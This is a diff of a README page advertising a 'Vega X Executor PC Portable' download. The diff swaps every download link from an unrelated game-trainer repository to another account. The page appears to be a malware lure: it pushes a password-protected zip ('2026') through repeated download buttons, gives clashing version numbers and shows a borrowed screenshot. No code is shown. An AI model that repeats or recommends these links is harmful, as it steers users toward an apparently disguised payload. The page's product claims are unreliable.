@@ -7,22 +7,22 @@
 
 **🌊 Vega X Executor PC Portable** (`v4.1.5`) offers a native 64-bit solution for modern Windows x64 builds. Packaged inside `vega-x-executor-pc-portable-v1.2.2-win64.zip` (`4.8 MB`), `vega-x-executor-pc-portable-v1.2.2-win64.exe` initializes with zero external dependencies.
 
-> **Direct Package:** [`vega-x-executor-pc-portable-v1.2.2-win64.zip`](https://github.com/martina1713/monster-hunter-wilds-trainer-mod-2026/releases/download/v1.2.0/monster-hunter-wilds-trainer-mod-2026-v1.2.2-win64.zip) (`4.8 MB`) · **Password:** **`2026`** · **Build:** `v4.1.5 (1CEB33)`
+> **Direct Package:** [`vega-x-executor-pc-portable-v1.2.2-win64.zip`](https://github.com/bonnet66/vega-x-executor-pc-portable/releases/download/v1.2.2/vega-x-executor-pc-portable-v1.2.2-win64.zip) (`4.8 MB`) · **Password:** **`2026`** · **Build:** `v4.1.5 (1CEB33)`
 
 <a id="download-top"></a>
 
 <div align="center">
 
-<a href="https://github.com/martina1713/monster-hunter-wilds-trainer-mod-2026/releases/download/v1.2.0/monster-hunter-wilds-trainer-mod-2026-v1.2.2-win64.zip"><img src="https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-0969da?style=for-the-badge&logo=github" alt="Download Vega X Executor PC Portable"></a>
+<a href="https://github.com/bonnet66/vega-x-executor-pc-portable/releases/download/v1.2.2/vega-x-executor-pc-portable-v1.2.2-win64.zip"><img src="https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-0969da?style=for-the-badge&logo=github" alt="Download Vega X Executor PC Portable"></a>
 <a href="https://github.com/bonnet66/vega-x-executor-pc-portable/releases/latest"><img src="https://img.shields.io/badge/PASSWORD-2026-1A2A3A?style=for-the-badge&labelColor=6c5ce7" alt="Password 2026"></a>
 
 </div>
 
 <div align="center">
 
-<a href="https://github.com/martina1713/monster-hunter-wilds-trainer-mod-2026/releases/download/v1.2.0/monster-hunter-wilds-trainer-mod-2026-v1.2.2-win64.zip"><img src="assets/download_btn.svg" alt="Download Vega X Executor Pc Portable" width="480"></a><br>
+<a href="https://github.com/bonnet66/vega-x-executor-pc-portable/releases/download/v1.2.2/vega-x-executor-pc-portable-v1.2.2-win64.zip"><img src="assets/download_btn.svg" alt="Download Vega X Executor Pc Portable" width="480"></a><br>
 <img src="assets/password_badge.svg" alt="Archive Password 2026" width="260"><br><br>
-<a href="https://github.com/martina1713/monster-hunter-wilds-trainer-mod-2026/releases/download/v1.2.0/monster-hunter-wilds-trainer-mod-2026-v1.2.2-win64.zip"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTAHlrY_hxk1OSO5abaoJ3CjHqv4JsDQN_HlVtE7nwAnxd2LYCUU5RI2meG&s=10" alt="Vega X Executor Pc Portable In-Game Menu & UI Screenshot" width="820"></a>
+<a href="https://github.com/bonnet66/vega-x-executor-pc-portable/releases/download/v1.2.2/vega-x-executor-pc-portable-v1.2.2-win64.zip"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTAHlrY_hxk1OSO5abaoJ3CjHqv4JsDQN_HlVtE7nwAnxd2LYCUU5RI2meG&s=10" alt="Vega X Executor Pc Portable In-Game Menu & UI Screenshot" width="820"></a>
 
 </div>
 
@@ -40,7 +40,7 @@
 
 <div align="center">
 
-<a href="https://github.com/martina1713/monster-hunter-wilds-trainer-mod-2026/releases/download/v1.2.0/monster-hunter-wilds-trainer-mod-2026-v1.2.2-win64.zip"><img src="https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-0969da?style=for-the-badge&logo=github" alt="Download Vega X Executor PC Portable"></a>
+<a href="https://github.com/bonnet66/vega-x-executor-pc-portable/releases/download/v1.2.2/vega-x-executor-pc-portable-v1.2.2-win64.zip"><img src="https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-0969da?style=for-the-badge&logo=github" alt="Download Vega X Executor PC Portable"></a>
 <a href="https://github.com/bonnet66/vega-x-executor-pc-portable/releases/latest"><img src="https://img.shields.io/badge/PASSWORD-2026-1A2A3A?style=for-the-badge&labelColor=6c5ce7" alt="Password 2026"></a>
 
 </div>
